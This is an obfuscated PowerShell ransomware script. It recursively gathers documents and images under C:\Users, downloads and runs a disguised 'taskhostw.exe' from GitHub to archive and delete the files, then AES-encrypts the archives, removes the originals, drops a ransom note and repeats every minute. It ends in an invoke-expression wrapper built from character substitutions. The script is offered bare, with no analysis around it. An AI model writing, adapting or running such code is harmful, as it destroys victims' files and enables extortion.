('function AESEncryption {
    [CmdletBinding(SupportsShouldProcess)]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('E')]
        [string]$Sss,

        [Parameter(Mandatory = $true)]
        [string]$Kkk,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [string]$Pth
    )

    Begin {
        $cha = New-Object System.Security.Cryptography.SHA256Managed
        $opd = New-Object System.Security.Cryptography.AesManaged
        $opd.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $opd.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $opd.BlockSize = 128
        $opd.KeySize = 256
    }

    Process {
        $opd.Key = $cha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Kkk))
        $opd.IV = [System.Text.Encoding]::UTF8.GetBytes("5sP3Rs3cr3tIn1tV")

        switch ($Sss) {
            'E' {
                if ($Pth) {
                    $Flfl = Get-Item -Path $Pth -ErrorAction SilentlyContinue
                    if (!$Flfl.FullName) {
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($Flfl.FullName)
                    $op = $Flfl.FullName + ".glhf"
                }
                $grod = $opd.CreateEncryptor()
                $eby = $grod.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $eby = $eby
                $opd.Dispose()
                
                if ($Pth) {
                    if ($PSCmdlet.ShouldProcess($op, "WEF")) {
                        [System.IO.File]::WriteAllBytes($op, $eby)
                        (Get-Item $op).LastWriteTime = $Flfl.LastWriteTime
                        Remove-Item -Path $Flfl.FullName -Force
                    }                    
                }
            }
        }
    }
    End {
        $cha.Dispose()
        $opd.Dispose()
    }
}

function xor {
    param($st, $sel)
    $def = $enc.GetBytes("N0P@5sw0rD")
    if ($sel -eq "D"){
        $st = $enc.GetString([System.Convert]::FromBase64String($st))
    }
    $fofo = $enc.GetBytes($st)
    $kodo = $(for ($i = 0; $i -lt $fofo.length; ) {
        for ($j = 0; $j -lt $def.length; $j++) {
            $fofo[$i] -bxor $def[$j]
            $i++
            if ($i -ge $fofo.Length) {
                $j = $def.length
            }
        }
    })
    if ($sel -eq "E") {
        $kodo = [System.Convert]::ToBase64st($kodo)
    } else {
        $kodo = $enc.GetString($kodo)
    }
    return $kodo
}

while (1){
    $dld = @(vl4*.pdf','*.xlsvl4,'*.xlsx','*.ppt','*.doc','*.docx','*.jpg','*.png','*.txt')
    $ade = Get-ChildItem -Path C:\Users -Recurse -File -Include $dld -exclude ransomnote.txt
    $enc = [System.Text.Encoding]::UTF8
    $dude = Get-ItemPropertyValue -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders' -Name MicrosoftCrypto
    for ($i=0;$i -le 10;$i++){
        $dude = xor "$dude" "D"
    }
    echo "All your important files were encrypted on this computer.
    You can verify this by click on see files an try open them.
    Encrtyption was produced using unique key generated for this computer.
    To decrypted files, you need to decrypt by youself" > C:\Users\Huntsman\Desktop\ransomnote.txt
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest "https://github.com/WirapongP/taskhostw/raw/main/taskhostw.exe" -OutFile "taskhostw.exe"
    foreach ($omg in $ade) {
        .\taskhostw.exe a -tzip -sdel "$omg.gl" $omg
        AESEncryption -Sss E -Kkk "$dude" -Pth "$omg.gl"
    }
    Start-Sleep -Seconds 60
}').REplaCe('$',[strING][Char]36).REplaCe(([Char]78+[Char]110+[Char]102),'\').REplaCe(([Char]48+[Char]101+[Char]77),[strING][Char]34).REplaCe(''',[strING][Char]39) |.( ([strinG]$VErBosEPrEFERence)[1,3]+'x'-join'')
